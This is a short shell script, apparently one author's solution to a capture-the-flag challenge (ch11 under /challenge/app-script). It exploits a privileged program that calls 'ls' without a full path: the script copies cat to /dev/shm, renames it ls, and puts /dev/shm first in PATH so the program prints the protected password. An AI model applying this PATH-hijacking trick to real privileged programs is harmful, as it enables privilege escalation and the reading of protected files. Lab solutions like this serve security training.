# Change /dev/shm to a writeable directory or keep it 
# Copying 'cat' and changing it to ls to delude the system
cp /bin/cat /dev/shm
# Use use ( mv ) Move command because we cannot use ( rn ) 
mv /dev/shm/cat /dev/shm/ls
# Now we change our PATH to the new 'Fake path' ( /dev/shm )
export PATH=/dev/shm:$PATH
# Crack
cd /challenge/app-script/ch11
echo "Crybik's Solution" , The password is :
./ch11